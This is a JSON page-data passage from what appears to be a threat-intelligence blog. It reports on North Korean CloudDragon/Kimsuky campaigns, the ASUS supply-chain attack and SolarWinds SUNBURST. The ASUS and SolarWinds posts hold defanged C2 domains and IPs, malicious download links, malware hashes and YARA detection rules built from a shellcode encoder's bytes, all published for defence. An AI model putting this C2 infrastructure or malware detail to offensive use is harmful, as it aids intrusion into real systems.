{"pageProps":{"post":{"publish":true,"enable_form":false,"tags":[{"_id":"609a50942107530037594aff","name":"CloudDragon","createdAt":"2021-05-11T09:38:28.264Z","updatedAt":"2021-05-11T09:38:28.274Z","__v":0,"id":"609a50942107530037594aff"},{"_id":"5ecf88fdfedd7f004b26978c","name":"supply chain attack","createdAt":"2020-05-28T09:48:45.048Z","updatedAt":"2020-05-28T09:54:04.229Z","__v":0,"id":"5ecf88fdfedd7f004b26978c"},{"_id":"5eec1270163518003f86d921","name":"cyber espionage","createdAt":"2020-06-19T01:18:40.849Z","updatedAt":"2020-06-19T01:18:40.849Z","__v":0,"id":"5eec1270163518003f86d921"},{"_id":"60dab1533f9d29004041a4fb","name":"South Korea","createdAt":"2021-06-29T05:36:19.782Z","updatedAt":"2021-06-29T05:36:19.791Z","__v":0,"id":"60dab1533f9d29004041a4fb"}],"relative_posts":[{"publish":true,"enable_form":false,"tags":[{"_id":"609a50942107530037594aff","name":"CloudDragon","createdAt":"2021-05-11T09:38:28.264Z","updatedAt":"2021-05-11T09:38:28.274Z","__v":0,"posts":[{"publish":true,"enable_form":false,"tags":["609a3fe42107530037594af9","609a50592107530037594afe","609a50942107530037594aff"],"relative_posts":["5f2b78f2163518003f86da49"],"_id":"609a38e42107530037594ae8","banner_img_url":"https://res.cloudinary.com/dvgomg5gh/image/upload/f_auto/v1620719167/BHASIA_88b5755e14.png","post_name":"【BlackHat Asia】TeamT5 研究員登上亞洲黑帽安全大會","post_url":"teamt5-on-black-hat-asia-2021","publish_date":"2021-05-12T03:00:00.000Z","contents":[{"locale":"tw","_id":"609a38e42107530037594ae9","title":"【BlackHat Asia】TeamT5 研究員登上亞洲黑帽安全大會","context":"圖片來源：[Black Hat](https://www.blackhat.com/asia-21/)\n\n全球資安盛會「亞洲黑帽安全大會」（Black Hat Asia, BHASIA）今年以線上方式舉辦，自 2021 年 5 月 4 日至 7 日（新加坡時間 UTC+8），為期四天的精彩議程（Black Hat Briefing）、專業深入培訓（Training），以及最新開源駭客工具的展示（Black Hat Arsenal），由頂尖資訊安全專家們傳授最新、第一手的技術與研究發現。\n\nTeamT5 威脅情資研究員們也登上今年的 BHASIA，發表兩場最新研究，與世界各地的資安研究人員交流最新的資訊安全風險、研究與趨勢。「[Mem2Img: Memory-Resident Malware Detection via Convolution Neural Network](https://www.blackhat.com/asia-21/briefings/schedule/#memimg-memory-resident-malware-detection-via-convolution-neural-network-22262)」由 TeamT5 技術長 Charles 與惡意程式研究員 Aragorn 介紹過去一年間發現的 APT 新攻擊手法，並發表他們基於 Mem2Img 框架的研究如何面對日新月異的惡意程式變種與變形，以及可能面臨的攻擊。\n\n![Mem2Img.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1620721192/Mem2_Img_7e094e8568.png)\n_TeamT5 研究員發表基於 Mem2Img 框架如何分類記憶體中的惡意程式，並提出該框架可能面臨的攻擊。_\n\n<br>\n\n另一場演講「[“We Are About to Land”: How CloudDragon Turns a Nightmare Into Reality](https://www.blackhat.com/asia-21/briefings/schedule/index.html#we-are-about-to-land-how-clouddragon-turns-a-nightmare-into-reality-22252)」，則由我們的資深威脅情資分析師 Linda 與惡意程式研究員 DuckLL，獨家揭露 TeamT5 持續追蹤的北韓 APT 攻擊族群 CloudDragon 的攻擊行為與入侵的防禦偵測手法，包括該族群如何分群的介紹，以及三大亮點：加密貨幣產業的供應鏈攻擊（supply chain attack）、跨平台的惡意軟體攻擊、自動化更新的釣魚網頁內容。\n\n![who_is_CloudDragon_1.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1620719929/who_is_Cloud_Dragon_1_2f78c12676.png)\n_TeamT5 威脅情資研究員向大家介紹 CloudDragon 為何分群以及如何分群_\n\n![clouddragon_2.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1620724347/clouddragon_2_e8856cbe0a.png)\n_CloudDragon 利用包括韓國本土與世界性的網路服務提供商進行惡意攻擊_\n\n<br>\n\n## 關於黑帽\n\n黑帽大會（Black Hat）每年聚集全球資訊安全專家、優秀研究人員於一堂，透過資安研究、開發與最新趨勢交流，鼓勵學術界、世界級研究人員與各領域決策及領導者間的合作、成長。黑帽簡報會（Black Hat Briefing）與培訓（Training）每年也都在美國、歐洲與亞洲舉行，匯集全球資安頂尖人員參與盛會。\n\n<br>\n","__v":0,"id":"609a38e42107530037594ae9"}],"createdAt":"2021-05-11T07:57:24.015Z","updatedAt":"2021-05-13T03:37:18.936Z","__v":1,"author":"5eec3483163518003f86d943","topic":"5ecaa036a792d70040a0d8b4","id":"609a38e42107530037594ae8"},{"publish":false,"enable_form":false,"tags":["609a3fe42107530037594af9","609a50942107530037594aff"],"relative_posts":["609a38e42107530037594ae8"],"_id":"609b803a2107530037594b0e","post_name":"【Korea Boannews】TeamT5 Announces Latest Attack Trend of \"Kimsuky\" Group at Black Hat Asia","post_url":"teamt5-announces-latest-attack-trend-of-kimsuky-group-at-blackhat-asia","publish_date":"2021-05-11T05:00:00.000Z","contents":[{"locale":"en","_id":"609b803a2107530037594b0f","context":"*Image courtesy of [Black Hat](https://www.blackhat.com/asia-21/)\n\nTeamT5, a Taiwanese cyber threat investigation company, shared the results of a recent study on the North Korean Kimsuky group at the \"Black Hat Asia Conference\" held in Singapore last week. The Kimsuky group is already widely known and is a group that the US CISA has jointly specified with related organizations such as the FBI, and TeamT5's research is the industry's first presentation on Kimsuky this year.\n\nTeamT5 revealed that the Kimsuky group was separated from a single group and divided into two groups, and it seems that each is operated separately for different targets. TeamT5 named them \"CloudDragon\" and \"KimDragon\" respectively, and introduced the target countries and hacking tools.\n\nTeamT5 announced for the first time that the Kimsuky group is focusing on supply chain attacks. The target is cryptocurrency, and the digital wallet of the exchange and its owner. To this end, the Kimsuky group uses a wide range of operating system combinations of PC, Android, and iOS. Currently, portal companies are concentrating on cross-authentication of PC and mobile at the same time for user authentication, so that the same malicious code can be operated in different environments.\n\nTeamT5 researchers schematically presented evidence of the involvement of Kimsuky's group in the domestic cryptocurrency hacking case last October. According to this, it is known that the stolen cryptocurrency was transferred to a Dutch IP address and used for laundry. Even hardware wallets known to be secure appear to have been hacked.\n\nIn addition, they also announced that they are mainly targeting fake login-inducing accounts on portal sites such as Daum, Naver, and Google. Users can receive new user credentials update emails through bait files and hacked websites. Even Microsoft Windows update notifications were used in preliminary attacks. University login websites such as University Y, University E, and University D located in Seoul were used for hacking.\n\nIt was found that the Kimsuky group shifted its focus to not only PC but also mobile environment attacks. Their so-called \"hidden\" agents create SMS messages without the knowledge of cell phone victims, send written texts, and upload files. It means that you can do anything with a controlled phone, regardless of the user's will, such as taking audio or video. If cryptocurrency is stored on a mobile phone or log in through a mobile phone, it can be too easily exposed to hacking.\n\nS&C CEO Han Eun-hye, who is servicing the intelligence information of TeamT5 in Korea, said, \"It is time to detect their movements in advance based on a database that has been tracking the activities of individual hacker groups for a long time to deal with cybersecurity.\" It is necessary to respond to cyber attacks in the future by acquiring intelligence information specific to Asia from among the intelligence information.”\n\n[Read Full Story](https://www.boannews.com/media/view.asp?idx=97353)\n\n<br>\n","title":"【Korea Boannews】TeamT5 Announces Latest Attack Trend of \"Kimsuky\" Group at Black Hat Asia","__v":0,"id":"609b803a2107530037594b0f"}],"createdAt":"2021-05-12T07:14:02.453Z","updatedAt":"2021-05-13T03:37:18.933Z","__v":1,"author":"5eec3483163518003f86d943","topic":"5ecaa036a792d70040a0d8b4","banner_img_url":"https://res.cloudinary.com/dvgomg5gh/image/upload/f_auto/v1620719167/BHASIA_88b5755e14.png","id":"609b803a2107530037594b0e"},{"publish":true,"enable_form":false,"tags":["609a50942107530037594aff","5ecf88fdfedd7f004b26978c","5eec1270163518003f86d921"],"relative_posts":["60dbea363f9d29004041a50d"],"_id":"60dab1403f9d29004041a4fa","post_url":"clouddragon-campaign-vpn-zero-day-vulnerability-new-backdoor","contents":[{"locale":"en","_id":"60dab3393f9d29004041a4fe","title":"CloudDragon's Campaign: VPN Zero-day Vulnerability + New Backdoor","__v":0,"context":"*Image courtesy of [Pixabay](https://pixabay.com/photos/flag-banner-nation-emblem-country-2528969/)\n\nTeamT5 recently discovered two installers of a newly identified backdoor which we named MemzipRAT. The backdoor is named after an embedded string \"get module from cmd memzip : %d\" inside the PE files.\n\nWith further investigation, we believe this attack was aiming at a South Korean company in the aerospace sector. The company is part of a top 10 conglomerate in South Korea, whose business includes aerospace, chemicals, financial services, IT, etc.\n\nIn fact, CloudDragon has been accused of using VPN vulnerabilities to attack numerous entities, including Korean government agencies [1], recently. It is highly possible that they deployed their new malware by the new vulnerability in this case as well. \n\n<br>\n\nYet, there are two key factors that might pull the trigger of massive intrusions:\n\n1. VPN vulnerability\n\n The VPN market in 2020 is USD $30 billion worldwide. That is, the market is huge and has multiple players inside. It could be a starting point for actors to infiltrate various corporations not only in South Korea, but to the whole world.\n \n2. Sectors involved\n\n As the identified target involved in crucial sectors, such as IT, it has a great chance to affect hundreds of entities in a short period.\n\n<br>\n\nWe strongly advise everyone to take careful attention to CloudDragon's recent campaign for it might end up a severe supply chain attack.\n\n## Reference\n\n[1] https://biz.chosun.com/policy/politics/2021/06/18/V4DTFCEXPRA4DFCBVVJO3DPR5I/\n\n<br>\n\n<br>","id":"60dab3393f9d29004041a4fe"}],"createdAt":"2021-06-29T05:36:00.041Z","updatedAt":"2021-07-01T03:16:55.564Z","__v":0,"author":"5eeae9e3163518003f86d917","topic":"5ecaa012a792d70040a0d8b1","banner_img_url":"https://res.cloudinary.com/dvgomg5gh/image/upload/f_auto/v1624944845/flag_2528969_1920_10918af673.jpg","publish_date":"2021-06-30T10:00:00.000Z","post_name":"CloudDragon's Campaign: VPN Zero-day Vulnerability + New Backdoor","id":"60dab1403f9d29004041a4fa"},{"publish":true,"enable_form":false,"tags":["609a50942107530037594aff","5ecf88fdfedd7f004b26978c","5eec1270163518003f86d921","60dab1533f9d29004041a4fb"],"relative_posts":["60dab1403f9d29004041a4fa"],"_id":"60dbea363f9d29004041a50d","post_name":"Another CloudDragon attack abusing VPN zero-day vulnerability to target South Korean entities","post_url":"another-clouddragon-attack-abusing-vpn-zero-day-vulnerability-to-target-south-korean-entities","publish_date":"2021-07-01T02:00:00.000Z","contents":[{"locale":"en","_id":"60dbea363f9d29004041a50e","context":"*Image courtesy of [Pixabay](https://pixabay.com/illustrations/north-korea-dprk-korea-juche-asia-1151137/)\n\nThe North Korean APT group CloudDragon, also known as Kimsuky, continues to target South Korean governments and organizations. TeamT5 has been actively monitoring this threat actor and we recently discovered CloudDragon abusing VPN zero-day vulnerability to launch a new attack against South Korean entities.\n\nTeamT5 recently discovered two malicious samples circulating in South Korea, and both samples are installers of a newly identified backdoor which we named MemzipRAT. With further investigation, we believe this attack was aiming at a South Korean company in the aerospace sector. The company is part of a top 10 conglomerate in South Korea, whose business includes aerospace, chemicals, financial services, IT, etc. \n\nIn fact, CloudDragon has been accused of using VPN vulnerabilities to attack numerous entities recently, including Korean government agencies. According to TeamT5’s threat intelligence, we hold high confidence that the above malware to be follow-up attacks of the disclosed attack campaign conducted by CloudDragon. As the exploitation starts from a popular VPN system, these campaigns might lead to massive attacks and damage in the near future. And TeamT5 will keep taking careful attention to CloudDragon's recent campaign for it might end up a severe supply chain attack.\n\n<br>\n","title":"Another CloudDragon attack abusing VPN zero-day vulnerability to target South Korean entities","__v":0,"id":"60dbea363f9d29004041a50e"},{"locale":"tw","_id":"60dbeb6c3f9d29004041a510","title":"北韓駭客組織再次利用 VPN 零時差漏洞對南韓航太產業發動攻擊","context":"圖片來源：[Pixabay](https://pixabay.com/illustrations/north-korea-dprk-korea-juche-asia-1151137/)\n\n北韓 APT 攻擊族群 CloudDragon（又名為 Kimsuky）持續針對南韓政府與組織發動攻擊。 TeamT5 長期持續關注此駭客族群，發現 CloudDragon 近期利用 VPN 零時差漏洞（zero-day vulnerability）對南韓發動另一波新的攻擊。\n\n根據 TeamT5 近期研究，我們發現了兩個攻擊南韓的惡意程式樣本，與我們最新發現的後門程式 MemzipRAT 有高度關聯，皆為其安裝程式。我們推測這一波攻擊是針對南韓某航太產業公司而來，該受駭公司為南韓前十大企業之一，業務範圍涵蓋航太、化學、金融、IT 服務等。攻擊者利用一尚未揭露的  VPN 伺服器漏洞，駭進目標環境並部署惡意程式。\n\n最近多起針對韓國的攻擊，包括南韓政府研究單位受駭，也疑似為 CloudDragon 透過 VPN 服務漏洞展開的入侵行動。根據 TeamT5 掌握的相關情資，我們有高度信心認為，這次攻擊使用的新後門程式為 CloudDragon VPN 攻擊的後續利用。我們推測，攻擊者將持續利用此知名 VPN 系統漏洞，發動更大型、損害更嚴重的攻擊，未來也不排除轉變為供應鏈攻擊的可能。\n\n<br>\n","__v":0,"id":"60dbeb6c3f9d29004041a510"}],"createdAt":"2021-06-30T03:51:18.736Z","updatedAt":"2021-07-01T03:16:55.562Z","__v":1,"author":"5eec3483163518003f86d943","topic":"5ecaa036a792d70040a0d8b4","banner_img_url":"https://res.cloudinary.com/dvgomg5gh/image/upload/f_auto/v1624944845/north_korea_1151137_1920_0727509c9b.jpg","id":"60dbea363f9d29004041a50d"}],"id":"609a50942107530037594aff"},{"_id":"5ecf88fdfedd7f004b26978c","name":"supply chain attack","createdAt":"2020-05-28T09:48:45.048Z","updatedAt":"2020-05-28T09:54:04.229Z","__v":0,"posts":[{"publish":false,"enable_form":false,"tags":["5ecf88f2fedd7f004b26978b","5ecf8956fedd7f004b269791","5ecf8973fedd7f004b269792","5ecf88fdfedd7f004b26978c"],"relative_posts":[],"_id":"5ecab33b602fc9004047603e","post_url":"asus-supply-chain-attack-a-technical-look-inside","post_name":"ASUS Supply-Chain Attack: A Technical Look Inside","banner_img_url":"https://res.cloudinary.com/dvgomg5gh/image/upload/v1590342261/startup-593324_1920_2fcd2ea5f0.jpg","contents":[{"locale":"en","_id":"5ecab33b602fc9004047603f","title":"ASUS Supply-Chain Attack: A Technical Look Inside","context":"photo courtesy of: pixabay.com\n\nAsus, one of the world's largest computer makers, was believed to be the newest victim of a supply chain attack. According to the up-to-date blog of Kaspersky [1], ASUS Live Software Server was compromised by attackers to install malicious backdoors on customers' devices.\n\nIt was alleged that the malware was delivered to millions of Asus computers, although the attackers targeted only 600 specific MAC addresses. This phenomenon has been observed in several supply chain attacks associated with China-backed APT actors, such as CCleaner and NetSarang supply chain attacks in 2017.\n\nTeamT5 found several samples of this serial attack and performed technical analysis on it. The C2 is https://asushotfix[.]com, which was shut down during our analysis. Thus, we are not able to provide further information at this time.\n\n![Figure 1: Shellcode encoding routine in ASUS sample, which is the same in PlugX Fast version](https://res.cloudinary.com/dvgomg5gh/image/upload/v1590342320/02_01_85f232f25d.png \"Figure 1: Shellcode encoding routine in ASUS sample, which is the same in PlugX Fast version\")\n_Figure 1: Shellcode encoding routine in ASUS sample, which is the same in PlugX Fast version_\n\nThe result indicates this attack was possibly carried out by Chinese hackers since they used PlugX Crypt for the shellcode derived from the file. Besides, TeamT5 observed several similar techniques between this attack and the previous cases, such as inserting malicious shellcode in the run-time initialization routine in C program. TeamT5 strongly believes that this supply chain attack on ASUS system was backed by China government and can be linked to the CCleaner and NetSarang attacks.\n\nFrom the C2 domain activation history, TeamT5 believes the initial campaign started from May 2018 and ended in around Oct 2018. However, the computers in the target list will be implanted with other malwares and keep being controlled by the threat actors. The only knowledge regarding the targets is a list of MAC address hashes and they could not be mapped to organizations or individuals. We urge our clients to check the IDS/IPS or try to use TeamT5's ThreatSonar to scan for further detection and defence.\n\n### Reference\n\n[1] https://securelist.com/operation-shadowhammer/89992/\n\n#### **Appendix**\n\nIndicator of Compromise (IoC)\n\n**C2 Domains and IPs:**\n\n* asushotfix[.]com\n* simplexoj[.]com\n* homeabcd[.]com\n* 35.154.92[.]115\n* 141.105.71[.]116\n\n**Malicious download links:**\n\n* hxxp://liveupdate01.asus[.]com/pub/ASUS/nb/Apps_for_Win8/LiveUpdate/Liveupdate_Test_VER365.zip\n* hxxps://liveupdate01s.asus[.]com/pub/ASUS/nb/Apps_for_Win8/LiveUpdate/Liveupdate_Test_VER362.zip\n* hxxps://liveupdate01s.asus[.]com/pub/ASUS/nb/Apps_for_Win8/LiveUpdate/Liveupdate_Test_VER360.zip\n* hxxps://liveupdate01s.asus[.]com/pub/ASUS/nb/Apps_for_Win8/LiveUpdate/Liveupdate_Test_VER359.zip\n\nHashes (MD5) :\n\n* 5855362028a58d8760c9ea2dcdf37af5\n* 0db57cc899ae7385c60b16a62b748a18\n* c0116d877d048b1ba87c0de6fd7c3fb2\n* 7df9736f60a979eee5b90d6c53dc9374\n* 56a046f11c84c691295267dcf1f00c4a\n* fa83ffde24f149f9f6d1d8bc05c0e023\n* 17a36ac3e31f3a18936552aff2c80249\n* 2a95475af7a07ee95ab11caad9e99b0c\n* 0f49621b06f2cdaac8850c6e9581a594\n* f2f879989d967e03b9ea0938399464ab\n* 06c19cd73471f0db027ab9eb85edc607\n* 63f2fe96de336b6097806b22b5ab941a\n* 9c74402572344aee9018587188fe441e\n* bd809a2abb1eda0e28becc1661b96581\n* 8baa46d0e0faa2c6a3f20aeda2556b18\n* cdb0a09067877f30189811c7aea3f253\n* aa15eb28292321b586c27d8401703494\n* 8756bafa7f0a9764311d52bc792009f9\n* 2ec9d0df80df005becbd37142811e43b\n* 55a7aa5f0e52ba4d78c145811c830107\n* 915086d90596eb5903bcd5b02fd97e3e\n* 5220c683de5b01a70487dac2440e0ecb\n* 5855ce7c4a3167f0e006310eb1c76313\n\n**Thumbprint of abused certificate:**\n\n* 626646d29c5b0e7c53aa84698a4a97be323cf17f\n\nYara rule:\n\n```yara\nrule apt_trojan_AsusSetup_encoder\n{\n  strings:\n    $plugx_crypt = { 55 8BEC 81EC 08010000 53 56 57 8DBD F8FEFFFF B9 42000000 B8 CCCCCCCC F3 AB C745 F8 00000000 C745 EC 00000000 8B45 08 8B08 894D E0 8B45 08 8B08 894D D4 8B45 08 8B08 894D C8 8B45 08 8B08 894D BC 8B45 E0 C1E8 03 8B4D E0 8D9401 EFEEEEEE 8955 E0 8B45 D4 C1E8 05 8B4D D4 8D9401 DEDDDDDD 8955 D4 8B45 C8 C1E0 07 B9 33333333 2BC8 034D C8 894D C8 8B45 BC C1E0 09 B9 44444444 2BC8 034D BC 894D EC 8B45 EC 8945 BC 8B45 08 0345 F8 0FB608 8B55 E0 81E2 FF000000 0FB6C2 8B55 D4 81E2 FF000000 0FB6D2 03C2 8B55 C8 81E2 FF000000 0FB6D2 03C2 8B55 EC 81E2 FF000000 0FB6D2 03C2 33C8 8B45 10 0345 F8 8808 8B45 F8 83C0 01 8945 F8 8B45 F8 3B45 0C 0F8C 50FFFFFF 5F 5E 5B 8BE5 5D C2 0C00 }\n\n  condition:\n    all of them\n}\n\nrule apt_trojan_AsusSetup_memory\n{\n  strings:\n    $plugx_crypt = { 55 8BEC 81EC 08010000 53 56 57 8DBD F8FEFFFF B9 42000000 B8 CCCCCCCC F3 AB C745 F8 00000000 C745 EC 00000000 8B45 08 8B08 894D E0 8B45 08 8B08 894D D4 8B45 08 8B08 894D C8 8B45 08 8B08 894D BC 8B45 E0 C1E8 03 8B4D E0 8D9401 EFEEEEEE 8955 E0 8B45 D4 C1E8 05 8B4D D4 8D9401 DEDDDDDD 8955 D4 8B45 C8 C1E0 07 B9 33333333 2BC8 034D C8 894D C8 8B45 BC C1E0 09 B9 44444444 2BC8 034D BC 894D EC 8B45 EC 8945 BC 8B45 08 0345 F8 0FB608 8B55 E0 81E2 FF000000 0FB6C2 8B55 D4 81E2 FF000000 0FB6D2 03C2 8B55 C8 81E2 FF000000 0FB6D2 03C2 8B55 EC 81E2 FF000000 0FB6D2 03C2 33C8 8B45 10 0345 F8 8808 8B45 F8 83C0 01 8945 F8 8B45 F8 3B45 0C 0F8C 50FFFFFF 5F 5E 5B 8BE5 5D C2 0C00 }\n\n  condition:\n    all of them\n}\n```\n\n#### How to use IOC in ThreatSonar\n\nA. You can import IOCs into ThreatSonar and launch \"Retro Hunt\" to see if there is any matches.\n\n![Import IOC into ThreatSonar Intel.](https://res.cloudinary.com/dvgomg5gh/image/upload/v1590342320/02_02_4ceec82521.png \"Import IOC into ThreatSonar Intel.\")\n_Import IOC into ThreatSonar Intel._\n\nB. The malware is using valid \"ASUSTek\" certificate, the thumbprint of the certificate can be searched in \"Hunter\" page.\n\n![Details of abused certificate.](https://res.cloudinary.com/dvgomg5gh/image/upload/v1590342320/02_03_0dce4b9764.png \"Details of abused certificate.\")\n_Details of abused certificate._\n\nIn \"Hunter\" page, you are able to search \"thumbprint = 626646d29c5b0e7c53aa84698a4a97be323cf17f\" by switching scope to \"Certificate\" (Please select \"Engine Version\" to All).\n\nP.S. If you find any matched results, don’t hesitate to contact with us.\n\n![Thumbprint matched endpoints and programs.](https://res.cloudinary.com/dvgomg5gh/image/upload/v1590342320/02_04_380dc77e41.png \"Thumbprint matched endpoints and programs.\")\n_Thumbprint matched endpoints and programs._\n![The related thumbprint was found.](https://res.cloudinary.com/dvgomg5gh/image/upload/v1590342398/02_05_6dfb694a3a.png \"The related thumbprint was found.\")\n_The related thumbprint was found._\n\nC. To use the yara rule, just create yara ruleset, then copy and paste the yara rule listed above.\n\n![Import the yara rule.](https://res.cloudinary.com/dvgomg5gh/image/upload/v1590342321/02_06_a1dfcf5ab0.png \"Import the yara rule.\")\n_Import the yara rule._\n","createdAt":"2020-05-24T17:47:39.800Z","updatedAt":"2020-07-02T08:45:53.754Z","__v":0,"id":"5ecab33b602fc9004047603f"}],"createdAt":"2020-05-24T17:47:39.794Z","updatedAt":"2020-07-02T08:45:53.779Z","__v":1,"topic":"5ecaa004a792d70040a0d8b0","author":null,"publish_date":"2019-03-28T04:00:00.000Z","id":"5ecab33b602fc9004047603e"},{"publish":true,"enable_form":false,"tags":["5ecf88fdfedd7f004b26978c","5fd96706542153003465f6fc","5fd9671d542153003465f6fd","5fd96738542153003465f6fe","5ecf8852fedd7f004b269789"],"relative_posts":["5f3fdeb5163518003f86dad5"],"_id":"5fd95f48542153003465f6e3","post_url":"teamt5-security-alert-report-solarwinds-orion-vulnerability-being-actively-exploited","publish_date":"2020-12-16T02:00:00.000Z","post_name":"TeamT5 安全性通報－知名 IT 監控平臺 SolarWinds Orion 證實遭供應鏈攻擊","contents":[{"locale":"tw","_id":"5fd95f48542153003465f6e4","title":"TeamT5 安全性通報－知名 IT 監控平臺 SolarWinds Orion 證實遭供應鏈攻擊","context":"圖片來源：[Pixabay](https://pixabay.com/photos/trojan-trojananisches-horse-craft-1700378/)\n\n##### *知名 IT 監控平臺 SolarWinds 淪陷，近期已有多個採用該平臺的組織遭到攻擊*\n\n## 說明\n\nSolarWinds 在今年 3 月到 6 月間釋出 2019.4 HF 5 至 2020.2.1 版本的 SolarWinds Orion Platform 遭到駭客供應鏈攻擊，導致服務存在遠端執行後門程式，公開情資指出，這是來自俄羅斯攻擊族群 APT29 的針對性攻擊行動。\n\nSolarWinds 已進行修補並釋出 Orion Platform 2020.2.1 HF 1，預計在 12 月 15 日釋出 2020.2.1 HF 2，建議各單位在 2020.2.1 HF 2 釋出後立即更新，此一版本不只修補了有問題的元件，也進一步提供安全措施。\n\nFireEye 日前公布遭受駭客攻擊，提供的公開情資包含 SolarWinds 相關元件（SolarWinds.Orion.Core.BusinessLayer.dll），TeamT5 取得樣本並分析其中的惡意程式 SUNBURST。\n\n![201215通報-1.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1608081281/201215_1_207508801e.png)\n_圖一、惡意程式的 Job Class 提供各種操作指令_\n\n![201215通報-2.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1608081281/201215_2_b31cd3e1e9.png)\n_圖二、透過 HTTP 和 Orion Improvement Program（OIP）傳輸指令_\n\n<br>\n\n## 受影響的版本\n\n- SolarWinds Orion Platform 2019.4 HF 5\n- SolarWinds Orion Platform 2020.2 – 2020.2 HF 1\n\n## 修補與防範建議\n\n- 隔離 Orion server 直到 [SolarWinds](https://customerportal.solarwinds.com) 提供修補程式並安裝\n- 於 ThreatSonar 檢查是否有使用 SolarWinds\n\n  1. 點擊威脅狩獵功能\n  2. 點擊 Certificates\n  3. 搜尋 SolarWinds 的憑證 thumbprint，搜尋語法：\n\n      thumbprint = 47D92D49E6F7F296260DA1AF355F941EB25360C4\n\n  4. 點擊 Obj Cnt.下方數字，檢查是否有包含 Orion 名稱的項目\n\n![201215通報-3.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1608081281/201215_3_88a79a1fec.png)\n_圖三、威脅狩獵功能搜尋 SolarWinds 的憑證_\n\n![201215通報-4.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1608081281/201215_4_5a8fdda638.png)\n_圖四、搜尋 Orion 確認是否存在相關檔案_\n\n<br>\n\n## FireEye 公開的 IoC 資訊\n\n- 中繼站 Domain 以及 IP\n\n<br>\n\n|IOC|類型|\n|----|----|\n|avsvmcloud[.]com|Domain|\n|freescanonline[.]com|Domain|\n|deftsecurity[.]com|Domain|\n|thedoccloud[.]com|Domain|\n|websitetheme[.]com|Domain|\n|highdatabase[.]com|Domain|\n|incomeupdate[.]com|Domain|\n|databasegalore[.]com|Domain|\n|panhardware[.]com|Domain|\n|zupertech[.]com|Domain|\n|13.59.205[.]66|IP Address|\n|54.193.127[.]66|IP Address|\n|54.215.192[.]52|IP Address|\n|34.203.203[.]23|IP Address|\n|139.99.115[.]204|IP Address|\n|5.252.177[.]25|IP Address|\n|5.252.177[.]21|IP Address|\n|204.188.205[.]176|IP Address|\n|51.89.125[.]18|IP Address|\n|167.114.213[.]199|IP Address|\n\n\n- 檔案 Hash（MD5）\n\n|IOC|類型|\n|----|----|\n|02af7cec58b9a5da1c542b5a32151ba1|MD5 Hash|\n|08e35543d6110ed11fdf558bb093d401|MD5 Hash|\n|2c4a910a1299cdae2a4e55988a2f102e|MD5 Hash|\n|846e27a652a5e1bfbd0ddd38a16dc865|MD5 Hash|\n|b91ce2fa41029f6955bff20079468448|MD5 Hash|\n|4f2eb62fa529c0283b28d05ddd311fae|MD5 Hash|\n|56ceb6d0011d87b6e4d7023d7ef85676|MD5 Hash|\n\n\n## 參考資料\n\n- https://www.solarwinds.com/securityadvisory\n- https://www.cert.govt.nz/it-specialists/advisories/solarwinds-orion-vulnerability-being-actively-exploited/\n- https://www.ithome.com.tw/news/141651\n- https://github.com/fireeye/sunburst_countermeasures\n \n<br>\n","__v":0,"id":"5fd95f48542153003465f6e4"}],"createdAt":"2020-12-16T01:13:44.571Z","updatedAt":"2021-01-27T04:40:55.492Z","__v":1,"author":"5eeae43e163518003f86d914","topic":"5ecaa004a792d70040a0d8b0","banner_img_url":"https://res.cloudinary.com/dvgomg5gh/image/upload/f_auto/v1608084831/trojan_1700378_1920_7590bb01ea.jpg","id":"5fd95f48542153003465f6e3"},{"publish":true,"enable_form":false,"tags":["609a50942107530037594aff","5ecf88fdfedd7f004b26978c","5eec1270163518003f86d921"],"relative_posts":["60dbea363f9d29004041a50d"],"_id":"60dab1403f9d29004041a4fa","post_url":"clouddragon-campaign-vpn-zero-day-vulnerability-new-backdoor","contents":[{"locale":"en","_id":"60dab3393f9d29004041a4fe","title":"CloudDragon's Campaign: VPN Zero-day Vulnerability + New Backdoor","__v":0,"context":"*Image courtesy of [Pixabay](https://pixabay.com/photos/flag-banner-nation-emblem-country-2528969/)\n\nTeamT5 recently discovered two installers of a newly identified backdoor which we named MemzipRAT. The backdoor is named after an embedded string \"get module from cmd memzip : %d\" inside the PE files.\n\nWith further investigation, we believe this attack was aiming at a South Korean company in the aerospace sector. The company is part of a top 10 conglomerate in South Korea, whose business includes aerospace, chemicals, financial services, IT, etc.\n\nIn fact, CloudDragon has been accused of using VPN vulnerabilities to attack numerous entities, including Korean government agencies [1], recently. It is highly possible that they deployed their new malware by the new vulnerability in this case as well. \n\n<br>\n\nYet, there are two key factors that might pull the trigger of massive intrusions:\n\n1. VPN vulnerability\n\n The VPN market in 2020 is USD $30 billion worldwide. That is, the market is huge and has multiple players inside. It could be a starting point for actors to infiltrate various corporations not only in South Korea, but to the whole world.\n \n2. Sectors involved\n\n As the identified target involved in crucial sectors, such as IT, it has a great chance to affect hundreds of entities in a short period.\n\n<br>\n\nWe strongly advise everyone to take careful attention to CloudDragon's recent campaign for it might end up a severe supply chain attack.\n\n## Reference\n\n[1] https://biz.chosun.com/policy/politics/2021/06/18/V4DTFCEXPRA4DFCBVVJO3DPR5I/\n\n<br>\n\n<br>","id":"60dab3393f9d29004041a4fe"}],"createdAt":"2021-06-29T05:36:00.041Z","updatedAt":"2021-07-01T03:16:55.564Z","__v":0,"author":"5eeae9e3163518003f86d917","topic":"5ecaa012a792d70040a0d8b1","banner_img_url":"https://res.cloudinary.com/dvgomg5gh/image/upload/f_auto/v1624944845/flag_2528969_1920_10918af673.jpg","publish_date":"2021-06-30T10:00:00.000Z","post_name":"CloudDragon's Campaign: VPN Zero-day Vulnerability + New Backdoor","id":"60dab1403f9d29004041a4fa"},{"publish":true,"enable_form":false,"tags":["609a50942107530037594aff","5ecf88fdfedd7f004b26978c","5eec1270163518003f86d921","60dab1533f9d29004041a4fb"],"relative_posts":["60dab1403f9d29004041a4fa"],"_id":"60dbea363f9d29004041a50d","post_name":"Another CloudDragon attack abusing VPN zero-day vulnerability to target South Korean entities","post_url":"another-clouddragon-attack-abusing-vpn-zero-day-vulnerability-to-target-south-korean-entities","publish_date":"2021-07-01T02:00:00.000Z","contents":[{"locale":"en","_id":"60dbea363f9d29004041a50e","context":"*Image courtesy of [Pixabay](https://pixabay.com/illustrations/north-korea-dprk-korea-juche-asia-1151137/)\n\nThe North Korean APT group CloudDragon, also known as Kimsuky, continues to target South Korean governments and organizations. TeamT5 has been actively monitoring this threat actor and we recently discovered 